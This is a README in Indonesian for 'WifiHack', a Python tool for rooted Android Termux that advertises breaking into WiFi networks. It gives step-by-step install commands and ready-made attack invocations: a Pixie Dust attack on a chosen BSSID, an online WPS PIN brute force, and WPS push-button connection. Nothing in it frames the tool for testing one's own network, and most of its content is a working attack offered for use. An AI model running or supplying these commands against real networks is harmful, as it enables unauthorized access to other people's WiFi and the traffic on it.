
### wifi-hacking
<p align="center"><img src="https://user-images.githubusercontent.com/75953873/115979290-66309900-a55b-11eb-8259-4b125efc42bb.png"></p>

                   
[![Python 3.5](https://img.shields.io/badge/Python-3.5-yellow.svg)](http://www.python.org/download/)
[![python](https://img.shields.io/badge/python-2.7-brightgreen.svg)](https://www.python.org/downloads/release/python-2714/)
[![OS](https://img.shields.io/badge/Tested%20On-Linux%20%7C%20Android-yellowgreen.svg)](https://termux.com/)



### Cara memperbarui WifiHack
Untuk memeriksa pembaruan dan melakukan pembaruan, jalankan perintah berikut:
```
(cd WifiHack && git pull)
```
## Fitur dan Isi:


```bash 

1. Pindai Jaringan

2. Mendapatkan Handshake

3. Membuat password hasil crack

4. Instal dukungan wireless

5. Serangan jaringan WPS

6. Pindai jaringan WPS

7. Membobol semua WiFi

8. Membobol handshake tanpa dukungan mode monitor



```

## Tested On :

* Kali Linux (🚫)
* BlackArch Linux (🚫)
* Ubuntu (🚫)
* Kali Nethunter (🚫)
* Termux ( Rooted Devices✅)
* Parrot OS (🚫)

## [Termux](https://termux.com/)
Harap dicatat bahwa akses root diperlukan.  

### Cara Meretas WiFi Menggunakan Termux! (Membutuhkan Akses Root)
<p align="center"><img src="https://e.top4top.io/p_37546u98c0.png"></


#### Manually
**Persyaratan instalasi**
 ```
 pkg install -y root-repo
 pkg install -y git tsu python wpa-supplicant pixiewps iw openssl
 ```
**Dapatkan Ibnu-Wifi**
 ```
  git clone --depth 1 https://github.com/gtajisan/WifiHack WifiHack
 ```
 
#### Running
 ```
 sudo python WifiHack/WifiHack.py -i wlan0 -K
 ```
 
 
 
# INSTALL VERSI LENGKAP
```
*JALANKAN PERINTAH INI*

pkg update && pkg upgrade -y

pkg install -y root-repo

pkg install -y git

pkg install -y tsu

pkg install -y python

pkg install -y python-pip

pkg install -y wpa-supplicant

pkg install -y pixiewps

pkg install -y iw

pkg install -y openssl

pip install pyfiglet requests
 ```

## Contoh penggunaan
Mulai serangan Pixie Dust pada BSSID yang ditentukan:
 ```
 sudo python3 WifiHack.py -i wlan0 -b 00:90:4C:C1:AC:21 -K
 ```
Tampilkan jaringan yang tersedia dan mulai serangan Pixie Dust pada jaringan yang ditentukan:

```
 sudo python3 WifiHack.py -i wlan0 -K
 ```
Lakukan serangan brute force WPS online dengan separuh pertama PIN yang ditentukan:

```
 sudo python3 WifiHack.py -i wlan0 -b 00:90:4C:C1:AC:21 -B -p 1234
 ```
 Mulai koneksi tombol tekan WPS:
 ```
 sudo python3 WifiHack.py -i wlan0 --pbc
 ```
